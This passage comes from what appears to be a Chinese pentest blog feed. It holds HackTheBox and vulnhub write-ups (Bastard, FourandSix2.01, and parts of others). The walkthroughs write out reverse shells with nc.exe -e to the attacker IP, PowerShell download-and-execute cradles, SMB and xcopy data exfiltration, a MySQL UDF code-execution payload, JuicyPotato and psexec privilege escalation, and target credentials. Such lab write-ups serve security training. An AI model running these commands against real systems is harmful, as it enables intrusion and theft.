class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbserver.py share . -smb2support -username fyhypo -password fyhypo<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>\share /user:fyhypo fyhypo<br><span class="hljs-built_in">copy</span> .\out.txt \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>\share\out.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out.txt | less -R --mouse<br></code></pre></td></tr></table></figure><blockquote><p>打了几十个补丁，且好几个exp因为权限不足运行失败，暂时可以放弃内核提权了</p></blockquote><h3 id="administrator"><a href="#administrator" class="headerlink" title="administrator"></a>administrator</h3><blockquote><p>由于是mc服务器，还有自己写的插件<code>playercounter-1.0-SNAPSHOT.jar</code>，玩家统计功能，大概率会和服务器进行认证后实时统计，所以对它逆向</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jd-gui playercounter-1.0-SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814212435.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814212417.png"></p><blockquote><p>拿到密码s67u84zKq8IXw，由于交互性太低没法直接在靶机runas后输密码，所以使用psexec或runascs：</p></blockquote><p>1、psexec：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">psexec.exe -accepteula -u administrator -p s67u84zKq8IXw -d -i <span class="hljs-built_in">cmd</span>.exe /c &quot;<span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (&#x27;whoami&#x27;) <span class="hljs-keyword">do</span> curl http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">9999</span>/%i&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814232000.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">psexec.exe -accepteula -u administrator -p s67u84zKq8IXw -d -i <span class="hljs-built_in">cmd</span>.exe /c &quot;c:\ProgramData\app\fyhypo.exe&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814232300.png"></p><p>2、runascs：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;iwr http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">8000</span>/runascs.exe -outfile runascs.exe&quot;<br>.\runascs.exe administrator s67u84zKq8IXw powershell -r <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">8888</span> -t <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240814233907.png"></p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><blockquote><p>现在已经拿到了administrator，那么只需要<code>psexec -s</code>就拿到了system的shell</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psexec-x64.exe -s -accepteula -i cmd.exe /c <span class="hljs-string">&quot;c:\ProgramData\root.exe&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">xcopy <span class="hljs-string">&quot;c:\Users\svc_minecraft\server&quot;</span> <span class="hljs-string">&quot;\\10.10.16.2\share&quot;</span> <span class="hljs-string">/E</span> <span class="hljs-string">/I</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Bastard</title>
    <link href="/blog/HTB/HTB%20Bastard/"/>
    <url>/blog/HTB/HTB%20Bastard/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111047.png"></p><blockquote><p>从ping结果的ttl&#x3D;127也能看出是windows机器</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT --min-rate 10000 -p- 10.129.22.66 -oA nmapscan/ports<br>nmap -sU --top-ports 20 10.129.22.66 -oA nmapscan/udp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810110955.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111014.png"></p><blockquote><p>http、rpc、未知</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sC -sV -O -p80,135,49154 10.129.22.66 -oA nmapscan/detail<br>nmap --script=vuln -p80,135,49154 10.129.22.66 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111717.png"></p><blockquote><p>两个rpc、一个drupal的iis7.5 web服务</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810121818.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810111621.png"></p><blockquote><p>Drupal的默认页</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810112455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810112536.png"></p><blockquote><p>drupal7.5，寻找nday</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#去掉msf和拒绝服务的结果</span><br>searchsploit drupal --exclude=<span class="hljs-string">&quot;(Metasploit)|Denial of Service&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113035.png"></p><p><strong>Drupal</strong>：</p><ol><li>Drupal 7.x Module Services - Remote Code Execution，通过注入可以写shell、拿管理员cookie、密码哈希；</li><li>Drupalgeddon 是存在于Drupal 7版本的CVE-2014-3704，可RCE，在2014年10.15出现补丁；</li><li>Drupalgeddon2 也被称为CVE-2018-7600，是在Drupal 7和Drupal 8版本中发现的⼀个远程执⾏代码漏洞；</li><li>Drupalgeddon3，也被称为CVE-2019-6340， 是在Drupal 8版本中发现的另⼀个远程执⾏代码漏洞。</li></ol><blockquote><p>该靶机发布于2017年，上述的2大概率不成，3、4可以确定有，但为了学习预期解还是从1下手</p></blockquote><blockquote><p>考虑到利用条件等原因，按如下顺序测试：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113339.png"></p><blockquote><p>vim先看41564：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113505.png"></p><blockquote><p>根据靶机对初始信息修改</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810113824.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810120545.png"></p><blockquote><p>再次查看初始信息设置，大概率是endpoint路径非默认，需要修改</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810120937.png"></p><blockquote><p>exp中给了出处blog，作者也说需要知道endpoint的路径</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810114717.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810121127.png"></p><blockquote><p>个人感觉可以理解为有rest风格的rpc</p></blockquote><p>目录爆破找endpoint路径，字典选择针对restful的endpoints的字典：</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810122306.png"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;api&#x2F;api-endpoints-res.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810160259.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://10.129.246.12/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -t 50 -e -s 200<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810160535.png"></p><blockquote><p>成功rce，接着用smb的nc拿反弹Shell：</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">smbserver.py share .<br>\\\\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810161901.png"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;(New-Object System.<span class="hljs-built_in">Net</span>.WebClient).Downloadfile(&#x27;http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">8000</span>/winpeas.exe&#x27;,&#x27;winpeas.exe&#x27;)&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810174543.png"></p><blockquote><p>winpeas全版本莫名卡住，无法进行，换msf的multi&#x2F;recon&#x2F;local_exploit_suggester：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810191410.png"></p><blockquote><p>保存到result后提取模块名到kernel</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> result | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;\n&#x27;</span> | grep <span class="hljs-string">&#x27;^exploit/&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; kernel<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810192214.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240810200301.png"></p><blockquote><p>不知道为什么每个利用都成功了但都没有创建会话</p></blockquote><h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p>接着换 windows-exploit-suggester ：</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811161115.png"></p><blockquote><p>ms13-005、ms11-011、ms10-073、ms10-059、ms10-047</p></blockquote><p>利用到ms10-059时：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\MS10-<span class="hljs-number">059</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">4445</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811170631.png"></p><blockquote><p>ms10-059成功，其余均失败</p></blockquote><h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p>换sherlock：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.16.2:8000/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811161813.png"></p><blockquote><p>ms10-092、ms15-051、ms16-032</p></blockquote><p>利用到ms15-051时：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ms15-<span class="hljs-number">051</span>_x64.exe whoami<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811172412.png"></p><blockquote><p>只有ms15-051利用成功</p></blockquote><blockquote><p>除此以外，exploit-db打不开的问题待解决！</p></blockquote><h3 id="cve-2018-8120"><a href="#cve-2018-8120" class="headerlink" title="cve-2018-8120"></a>cve-2018-8120</h3><blockquote><p>手工拿操作系统版本搜索</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811174636.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811174650.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811175106.png"></p><blockquote><p>只有CVE-2010-0020利用成功</p></blockquote><h3 id="juicy-potato"><a href="#juicy-potato" class="headerlink" title="juicy potato"></a>juicy potato</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811181038.png"></p><p>开启了SeImpersonatePrivilege权限，应当引起重视</p><blockquote><p>首先想到令牌窃取，但缺少SeDebugPrivilege无法完成；<br>接着想到printspoofer，但版本太低对不上；<br>最后考虑到版本很低，选择juicy potato</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811182007.png"></p><p>大概率可用，<a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p><blockquote><p>必要的CLSID可查 <a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/</a><br>选择 {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811182605.png"></p><p>利用前面起的smb中的cmd反弹shell：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">JuicyPotato.exe -l <span class="hljs-number">1337</span> -p c:\Windows\System32\<span class="hljs-built_in">cmd</span>.exe -t * -c &#123;<span class="hljs-number">9</span>B1F122C-<span class="hljs-number">2982</span>-<span class="hljs-number">4</span>e91-AA8B-E071D54F2A4D&#125; -a &quot;/c \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>\share\nc.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span> <span class="hljs-number">9999</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811183141.png"></p><blockquote><p>成功提权</p></blockquote><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><blockquote><p>drupal这类cms必有数据库(mysql)，在default&#x2F;connect.php配置文件偷到凭据</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201037.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201125.png"></p><blockquote><p>root身份，可以尝试udf</p></blockquote><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">root<br>mysql123!root<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811200212.png"></p><blockquote><p>即使是msf或nishang的终端仍然交互性不够，索性将3306转发到本地：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel server -p 9595 -reverse<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">chisel.exe client <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">9595</span> R:<span class="hljs-number">3306</span>:localhost:<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201339.png"></p><blockquote><p>验证可用性：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201713.png"></p><blockquote><p>版本正确、插件路径得到、利用权限正确</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811201939.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">locate mysqludf<br><span class="hljs-comment">#/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;\\\\10.10.16.6\\share\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&quot;;<br><br>create function sys_exec returns string soname &#x27;udf.dll&#x27;;<br><br>select sys_exec(&#x27;\\\\10.10.16.6\\share\\nc.exe -e cmd.exe 10.10.16.6 9999&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240811203148.png"></p><blockquote><p>除此以外，dll可用不用远程导入，直接hex后给到mysql的unhex导入就行</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="内核提权枚举"><a href="#内核提权枚举" class="headerlink" title="内核提权枚举"></a>内核提权枚举</h3><p>1、打靶机优先考虑sherlock.ps1</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;IEX(New-Object <span class="hljs-built_in">Net</span>.WebClient).downloadString(&#x27;http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">6</span>:<span class="hljs-number">8000</span>/Sherlock.ps1&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>2、其次考虑windows-exploit-suggester</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/kali/PE/wes<br>python2 windows-exploit-suggester.py --database 2024-08-10-mssb.xls  --systeminfo ../../vulnhub/systeminfo.txt<br></code></pre></td></tr></table></figure><blockquote><p>systeminfo.txt为copy靶机systeminfo信息</p></blockquote><p>3、可以使用MSF的multi&#x2F;recon&#x2F;local_exploit_suggester</p><blockquote><p>注意有些exp需要set target 1这样设置x64&#x2F;x86</p></blockquote><p>4、使用winpeas，需要尝试各种版本的，好多时候exe会跑不起来、bat卡住</p><p>5、wes-ng，windows-exploit-suggester的提升版，内核向量枚举特别全，需要手动<code>筛选提权+可用</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python wes.py systeminfo.txt -i <span class="hljs-string">&quot;Elevation of Privilege&quot;</span> -e<br></code></pre></td></tr></table></figure><p>6、Powerless.bat这个脚本也值得一看，虽然无内核提权，但其余很全</p><h3 id="exp库"><a href="#exp库" class="headerlink" title="exp库"></a>exp库</h3><p><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/">Windows - Privilege Escalation - Internal All The Things (swisskyrepo.github.io)</a></p><p><a href="https://github.com/Al1ex/WindowsElevation">Al1ex&#x2F;WindowsElevation: Windows Elevation(持续更新) (github.com)</a></p><p><a href="https://github.com/safesword/WindowsExp/tree/master">safesword&#x2F;WindowsExp: Windows全版本提权脚本 (github.com)</a></p><blockquote><p>除此以外，exploit-db打不开的问题还是没解决 :(</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub FourandSix2.01</title>
    <link href="/blog/vulnhub/vulnhub%20FourandSix2.01/"/>
    <url>/blog/vulnhub/vulnhub%20FourandSix2.01/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603210829.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603211917.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603212021.png"></p><blockquote><p>开放22和2049的nfs服务，且系统是OpenBSD 6.0</p></blockquote><blockquote><p>OpenBSD 6.0 是一个高度安全和稳定的操作系统，适合用于服务器、防火墙、路由器和安全敏感的开发环境。它通过默认的安全配置和严格的代码审查，提供了一个可靠的计算平台。</p></blockquote><h2 id="0x02-nfs渗透"><a href="#0x02-nfs渗透" class="headerlink" title="0x02 nfs渗透"></a>0x02 nfs渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603212932.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603213059.png"></p><blockquote><p>挂载上去，拿到压缩包</p></blockquote><h2 id="0x03-misc"><a href="#0x03-misc" class="headerlink" title="0x03 misc"></a>0x03 misc</h2><h4 id="7z爆破"><a href="#7z爆破" class="headerlink" title="7z爆破"></a>7z爆破</h4><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603214157.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">7z x 1.7z<br></code></pre></td></tr></table></figure><blockquote><p>有密码，john破解</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提取 7z 文件的哈希 </span><br>/usr/share/john/7z2john.pl 1.7z &gt; 1.<span class="hljs-built_in">hash</span> <br><span class="hljs-comment"># 使用 John the Ripper 进行破解 </span><br>john --format=7z 1.<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603215503.png"></p><h4 id="ssh私钥爆破"><a href="#ssh私钥爆破" class="headerlink" title="ssh私钥爆破"></a>ssh私钥爆破</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提取哈希</span><br>ssh2john id_rsa &gt; ssh.hash<br>john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603222942.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603223031.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603223930.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603225724.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">doas /usr/bin/less /var/log/authlog<br></code></pre></td></tr></table></figure><p>less读取文件后，按v进入vi，再输:!&#x2F;bin&#x2F;sh开启root shell</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603225753.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240603225904.png"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Kiotrix3</title>
    <link href="/blog/vulnhub/vulnhub%20Kiotrix3/"/>
    <url>/blog/vulnhub/vulnhub%20Kiotrix3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411111838.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411111959.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411112048.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411114029.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411112301.png" alt="image.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411112448.png" alt="image.png"></p><blockquote><p>自制cms、博客系统</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240411112651.png" alt="image.png"></p><p><img 